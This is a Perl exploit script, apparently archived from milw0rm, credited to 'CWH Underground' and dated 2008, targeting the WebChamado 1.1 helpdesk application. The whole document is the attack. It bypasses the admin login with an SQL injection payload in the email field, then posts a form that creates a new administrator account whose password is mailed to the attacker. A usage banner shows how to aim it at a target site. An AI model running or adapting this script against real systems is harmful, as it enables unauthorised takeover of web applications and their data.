<html><head><title>WebChamado 1.1 Arbitrary Add Admin Exploit</title></head><pre>#!/usr/bin/perl
#============================================
# WebChamado 1.1 Arbitrary Add Admin Exploit
#============================================
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 12 June 2008
#SITE : www.citec.us
#
#
#####################################################
#APPLICATION : WebChamado
#VERSION     : 1.1
#DOWNLOAD    : http://downloads.sourceforge.net/webchamado
######################################################
#
#Note: magic_quotes_gpc = off
#
#This Exploit will Add user to administrator's privilege and you will get password from email..



use LWP;
use HTTP::Request;
use HTTP::Cookies;

if ($#ARGV + 1 != 3)
{
   print &quot;\n==============================================\n&quot;;
   print &quot;  WebChamado 1.1 Arbitrary Add Admin Exploit  \n&quot;;
   print &quot;                                              \n&quot;;
   print &quot;        Discovered By CWH Underground         \n&quot;;
   print &quot;==============================================\n&quot;;
   print &quot;                                              \n&quot;;
   print &quot;                                              \n&quot;; 
   print &quot;Usage: ./xpl-webchamado.pl &lt;WebChamado URL&gt; &lt;user&gt; &lt;email&gt;\n&quot;;
   print &quot;Ex. ./xpl-webchamado.pl http://www.target.com/WebChamado/ cwhunderground cwh\@cwh.com\n&quot;;
   exit();
}

$cmsurl = $ARGV[0];
$user = $ARGV[1];
$mail = $ARGV[2];


$loginurl = $cmsurl.&quot;admin/index.php&quot;;
$adduserurl = $cmsurl.&quot;admin/corpo.php?menuadmin_responsavel=S&amp;rsp_tipusr=U&quot;;
$post_content = &quot;rsp_tipusr=U&amp;rsp_nome=&quot;.$user.&quot;&amp;rsp_codund=01&amp;rsp_coddep=31&amp;rsp_codfun=46&amp;rsp_eml=&quot;.$mail.&quot;&amp;rsp_adm=1&amp;rsp_mst=S&amp;rsp_btnresponsavel=Confirmar&quot;;

print &quot;\n..::Login Page URL::..\n&quot;;
print &quot;$loginurl\n&quot;;
print &quot;\n..::Add User Page URL::..\n&quot;;
print &quot;$adduserurl\n\n&quot;;

$ua = LWP::UserAgent-&gt;new;
$ua-&gt;cookie_jar(HTTP::Cookies-&gt;new);

$request = HTTP::Request-&gt;new (POST =&gt; $loginurl);
$request-&gt;header (Accept-Charset =&gt; 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
$request-&gt;content_type ('application/x-www-form-urlencoded');
$request-&gt;content ('eml=\') or 1=1/*&amp;pas=masteradm&amp;btn=Enviar');

$response = $ua-&gt;request($request);

$content = $response-&gt;content;

if ($content =~ /index_ok/)
{
   print &quot;Login Success !!!\n\n&quot;;
}
else
{
   print &quot;Login Failed !!!\n\n&quot;;
   exit();
}

$request = HTTP::Request-&gt;new (POST =&gt; $adduserurl);
$request-&gt;content_type ('application/x-www-form-urlencoded');
$request-&gt;content ($post_content);
$response = $ua-&gt;request($request);

$content = $response-&gt;content;

if ($content =~ /$user.*ADM.*$mail/)
{
   print &quot;Exploit Completed !!!\n&quot;;
}
else
{
   print &quot;Exploit Failed !!!\n&quot;;
}

# milw0rm.com [2008-06-13]</pre></html>